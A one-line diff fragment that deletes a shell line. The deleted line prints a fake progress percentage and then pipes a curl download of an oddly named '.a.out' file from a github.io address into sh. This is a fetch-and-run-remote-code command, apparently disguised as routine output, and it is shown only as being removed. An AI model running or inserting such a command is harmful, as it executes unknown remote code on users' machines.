@@ -1,1 +1,0 @@
-echo Progress: 16.00%curl -L --progress-bar frkns.github.io/fun/bloggingRegulationsReliabilityCountry.a.out | sh
